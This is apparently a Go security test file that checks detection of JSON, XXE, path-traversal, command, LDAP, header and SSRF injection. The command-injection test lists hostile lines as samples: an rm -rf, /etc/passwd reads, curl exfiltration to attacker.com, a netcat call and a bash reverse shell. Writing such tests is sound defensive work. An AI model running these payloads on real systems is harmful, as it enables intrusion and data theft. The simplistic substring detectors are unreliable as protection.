// Package security provides security testing for NebulaIO.
// These tests verify protection against injection attacks.
package security

import (
	"encoding/xml"
	"net/url"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestJSONInjection tests protection against JSON injection attacks.
func TestJSONInjection(t *testing.T) {
	t.Run("detects JSON injection in policy content", func(t *testing.T) {
		jsonInjectionPayloads := []string{
			`{"key": "value", "__proto__": {"isAdmin": true}}`,
			`{"key": "value", "constructor": {"prototype": {"isAdmin": true}}}`,
			`{"key": "value\", \"injected\": \"true\"}`,
			`{"key": "value", "nested": {"__proto__": {"polluted": true}}}`,
		}

		for _, payload := range jsonInjectionPayloads {
			detected := containsJSONInjectionRisk(payload)
			assert.True(t, detected, "Should detect JSON injection risk: %s", payload)
		}
	})

	t.Run("allows safe JSON content", func(t *testing.T) {
		safePayloads := []string{
			`{"Version": "2012-10-17", "Statement": []}`,
			`{"key": "value", "number": 123}`,
			`{"array": [1, 2, 3], "nested": {"key": "value"}}`,
			`{"boolean": true, "null": null}`,
		}

		for _, payload := range safePayloads {
			detected := containsJSONInjectionRisk(payload)
			assert.False(t, detected, "Safe JSON should not be flagged: %s", payload)
		}
	})
}

// TestXXEPrevention tests protection against XML External Entity attacks.
func TestXXEPrevention(t *testing.T) {
	t.Run("blocks XXE payloads", func(t *testing.T) {
		xxePayloads := []string{
			// File disclosure XXE
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
			// SSRF via XXE
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><root>&xxe;</root>`,
			// Parameter entity XXE
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>`,
			// Nested entity XXE
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "data">]><root>&xxe;</root>`,
			// Billion laughs attack (DoS via entity expansion)
			`<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>`,
		}

		for _, payload := range xxePayloads {
			detected := containsXXEVectors(payload)
			assert.True(t, detected, "Should detect XXE vector: %s", truncateForLog(payload))
		}
	})

	t.Run("safely parses XML without external entities", func(t *testing.T) {
		safeXML := `<?xml version="1.0"?><root><element>value</element></root>`

		result, err := safeXMLParse([]byte(safeXML))
		require.NoError(t, err)
		assert.Contains(t, result, "value")
	})

	t.Run("rejects XML with DOCTYPE", func(t *testing.T) {
		xmlWithDoctype := `<?xml version="1.0"?><!DOCTYPE root><root/>`

		_, err := safeXMLParse([]byte(xmlWithDoctype))
		assert.Error(t, err, "Should reject XML with DOCTYPE")
	})
}

// TestPathTraversalComprehensive tests comprehensive path traversal protection.
func TestPathTraversalComprehensive(t *testing.T) {
	t.Run("blocks encoded path traversal", func(t *testing.T) {
		encodedPayloads := []struct {
			name    string
			payload string
		}{
			{"URL encoded dots", "%2e%2e%2f%2e%2e%2f"},
			{"Double URL encoded", "%252e%252e%252f"},
			{"UTF-8 overlong encoding", "%c0%ae%c0%ae/"},
			{"Mixed encoding", "..%2f..%2f"},
			{"Unicode normalization", "..%c0%af"},
			{"Null byte injection", "../../../etc/passwd%00.jpg"},
			{"Backslash variant", "..\\..\\..\\"},
			{"Slash variant", "..//..//"},
		}

		for _, tc := range encodedPayloads {
			t.Run(tc.name, func(t *testing.T) {
				assert.True(t, containsPathTraversalAdvanced(tc.payload),
					"Should detect path traversal: %s", tc.payload)
			})
		}
	})

	t.Run("normalizes and validates paths", func(t *testing.T) {
		tests := []struct {
			input    string
			expected string
			safe     bool
		}{
			{"simple/path", "simple/path", true},
			{"../etc/passwd", "", false},
			{"/absolute/path", "absolute/path", true},
			{"./relative", "relative", true},
			{"path/../other", "", false},
		}

		for _, tc := range tests {
			t.Run(tc.input, func(t *testing.T) {
				result, safe := normalizeSafePath(tc.input)
				assert.Equal(t, tc.safe, safe, "Safety check for: %s", tc.input)

				if safe {
					assert.Equal(t, tc.expected, result)
				}
			})
		}
	})

	t.Run("prevents symlink attacks", func(t *testing.T) {
		// Symlink paths that could escape directory
		symlinkPayloads := []string{
			"/bucket/../../etc/passwd",
			"/bucket/symlink/../../../etc/passwd",
			"/bucket/./../../etc/passwd",
		}

		for _, payload := range symlinkPayloads {
			clean := filepath.Clean(payload)
			assert.False(t, isWithinBucket(clean, "/bucket"),
				"Path should not escape bucket: %s", payload)
		}
	})
}

// TestOSCommandInjection tests protection against OS command injection.
func TestOSCommandInjection(t *testing.T) {
	t.Run("detects command injection patterns", func(t *testing.T) {
		injectionPatterns := []string{
			"; cat /etc/passwd",
			"| ls -la",
			"&& rm -rf /",
			"$(whoami)",
			"`id`",
			"; ping -c 10 localhost",
			"| nc attacker.com 4444",
			"|| curl attacker.com",
			"; wget http://evil.com/malware",
			"&& chmod 777 /etc/passwd",
			"`curl http://attacker.com/$(whoami)`",
			"$(curl http://attacker.com/?data=$(cat /etc/passwd))",
			"; nslookup $(hostname).attacker.com",
			"| bash -i >& /dev/tcp/attacker/4444 0>&1",
		}

		for _, pattern := range injectionPatterns {
			assert.True(t, containsCommandInjectionAdvanced(pattern),
				"Should detect command injection: %s", pattern)
		}
	})

	t.Run("allows safe bucket names", func(t *testing.T) {
		safeNames := []string{
			"my-bucket",
			"test-bucket-123",
			"bucket.with.dots",
			"production-data-2024",
		}

		for _, name := range safeNames {
			assert.False(t, containsCommandInjectionAdvanced(name),
				"Safe name should not be flagged: %s", name)
		}
	})
}

// TestLDAPInjection tests protection against LDAP injection.
func TestLDAPInjection(t *testing.T) {
	t.Run("detects LDAP injection patterns", func(t *testing.T) {
		ldapPayloads := []string{
			"*)(uid=*))(|(uid=*",
			"admin)(&)",
			"*)(objectClass=*",
			")(cn=*",
			"*)(|(password=*))",
			"admin)(|(objectclass=*))",
		}

		for _, payload := range ldapPayloads {
			assert.True(t, containsLDAPInjection(payload),
				"Should detect LDAP injection: %s", payload)
		}
	})

	t.Run("allows safe usernames", func(t *testing.T) {
		safeUsernames := []string{
			"john.doe",
			"admin_user",
			"user123",
			"first-last",
		}

		for _, username := range safeUsernames {
			assert.False(t, containsLDAPInjection(username),
				"Safe username should not be flagged: %s", username)
		}
	})
}

// TestHeaderInjection tests protection against HTTP header injection.
func TestHeaderInjection(t *testing.T) {
	t.Run("detects header injection patterns", func(t *testing.T) {
		headerPayloads := []string{
			"value\r\nX-Injected: header",
			"value\nX-Injected: header",
			"value\r\n\r\n<html>body injection</html>",
			"value%0d%0aX-Injected: header",
			"value%0aX-Injected: header",
		}

		for _, payload := range headerPayloads {
			assert.True(t, containsHeaderInjection(payload),
				"Should detect header injection: %s", truncateForLog(payload))
		}
	})
}

// TestSSRFPrevention tests Server-Side Request Forgery prevention.
func TestSSRFPrevention(t *testing.T) {
	t.Run("blocks internal network URLs", func(t *testing.T) {
		internalURLs := []string{
			"http://localhost/admin",
			"http://127.0.0.1/admin",
			"http://169.254.169.254/latest/meta-data/", // AWS metadata
			"http://192.168.1.1/",
			"http://10.0.0.1/",
			"http://172.16.0.1/",
			"http://[::1]/",
			"http://0.0.0.0/",
			"http://metadata.google.internal/",
			"http://169.254.170.2/", // AWS ECS metadata
		}

		for _, urlStr := range internalURLs {
			parsedURL, err := url.Parse(urlStr)
			require.NoError(t, err)

			assert.True(t, isInternalURL(parsedURL),
				"Should detect internal URL: %s", urlStr)
		}
	})

	t.Run("allows external URLs", func(t *testing.T) {
		externalURLs := []string{
			"https://api.example.com/webhook",
			"https://s3.amazonaws.com/bucket",
			"https://storage.googleapis.com/bucket",
		}

		for _, urlStr := range externalURLs {
			parsedURL, err := url.Parse(urlStr)
			require.NoError(t, err)

			assert.False(t, isInternalURL(parsedURL),
				"External URL should be allowed: %s", urlStr)
		}
	})

	t.Run("handles URL bypass attempts", func(t *testing.T) {
		bypassAttempts := []string{
			"http://127.0.0.1.nip.io/",      // DNS rebinding
			"http://localtest.me/",          // Resolves to 127.0.0.1
			"http://127.1/",                 // Shortened IP
			"http://2130706433/",            // Decimal IP for 127.0.0.1
			"http://0x7f000001/",            // Hex IP for 127.0.0.1
			"http://localhost:80@evil.com/", // Credentials bypass
			"http://evil.com#@localhost/",   // Fragment bypass
		}

		for _, urlStr := range bypassAttempts {
			detected := containsSSRFBypass(urlStr)
			assert.True(t, detected, "Should detect SSRF bypass: %s", urlStr)
		}
	})
}

// Helper functions for injection detection

func containsJSONInjectionRisk(input string) bool {
	riskyPatterns := []string{
		"__proto__",
		"constructor",
		"prototype",
	}

	lower := strings.ToLower(input)
	for _, pattern := range riskyPatterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}

	return false
}

func containsXXEVectors(input string) bool {
	patterns := []string{
		"<!DOCTYPE",
		"<!ENTITY",
		"SYSTEM",
		"PUBLIC",
		"%xxe",
		"&xxe",
	}

	upper := strings.ToUpper(input)
	for _, pattern := range patterns {
		if strings.Contains(upper, strings.ToUpper(pattern)) {
			return true
		}
	}

	return false
}

func safeXMLParse(data []byte) (string, error) {
	// Check for DOCTYPE which could contain XXE
	if strings.Contains(string(data), "<!DOCTYPE") {
		return "", assert.AnError
	}

	var result struct {
		Content string `xml:",chardata"`
	}

	decoder := xml.NewDecoder(strings.NewReader(string(data)))
	decoder.Strict = true

	err := decoder.Decode(&result)
	if err != nil {
		return "", err
	}

	return result.Content, nil
}

func containsPathTraversalAdvanced(input string) bool {
	// Decode URL encoding
	decoded, err := url.QueryUnescape(input)
	if err != nil {
		decoded = input
	}

	// Double decode for nested encoding
	doubleDecoded, err := url.QueryUnescape(decoded)
	if err != nil {
		doubleDecoded = decoded
	}

	patterns := []string{"..", "%2e", "%252e", "%c0%af", "%c0%ae", "..\\", "%00"}

	lower := strings.ToLower(doubleDecoded)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}

	return false
}

func normalizeSafePath(input string) (string, bool) {
	// Clean the path
	clean := filepath.Clean(input)

	// Remove leading slash
	clean = strings.TrimPrefix(clean, "/")

	// Check for path traversal
	if strings.Contains(clean, "..") {
		return "", false
	}

	return clean, true
}

func isWithinBucket(path, bucket string) bool {
	clean := filepath.Clean(path)

	return strings.HasPrefix(clean, filepath.Clean(bucket))
}

func containsCommandInjectionAdvanced(input string) bool {
	patterns := []string{
		";", "|", "&&", "||", "$(", "`", ">>", "<<",
		"curl", "wget", "nc", "nslookup", "bash", "sh",
		"/dev/tcp", "/dev/udp",
	}

	for _, pattern := range patterns {
		if strings.Contains(input, pattern) {
			return true
		}
	}

	return false
}

func containsLDAPInjection(input string) bool {
	patterns := []string{"*)", ")(", "|(", "&(", "objectclass", "objectClass"}

	lower := strings.ToLower(input)
	for _, pattern := range patterns {
		if strings.Contains(lower, strings.ToLower(pattern)) {
			return true
		}
	}

	return false
}

func containsHeaderInjection(input string) bool {
	// Check for raw CRLF/LF
	if strings.Contains(input, "\r") || strings.Contains(input, "\n") {
		return true
	}

	// Check for encoded CRLF/LF
	lower := strings.ToLower(input)

	return strings.Contains(lower, "%0d") || strings.Contains(lower, "%0a")
}

func isInternalURL(u *url.URL) bool {
	host := u.Hostname()

	internalPatterns := []string{
		"localhost",
		"127.0.0.1",
		"0.0.0.0",
		"::1",
		"169.254.",  // AWS metadata
		"192.168.",  // Private
		"10.",       // Private
		"172.16.",   // Private
		"172.17.",   // Docker
		"metadata.", // Cloud metadata
	}

	for _, pattern := range internalPatterns {
		if strings.HasPrefix(host, pattern) || host == pattern || strings.Contains(host, pattern) {
			return true
		}
	}

	return false
}

func containsSSRFBypass(input string) bool {
	bypassPatterns := []string{
		".nip.io",
		"localtest.me",
		"127.1",
		"@localhost",
		"#@",
		"2130706433", // Decimal 127.0.0.1
		"0x7f",       // Hex prefix
	}

	lower := strings.ToLower(input)
	for _, pattern := range bypassPatterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}

	return false
}

func truncateForLog(s string) string {
	const maxLen = 100
	if len(s) > maxLen {
		return s[:maxLen] + "..."
	}

	return s
}
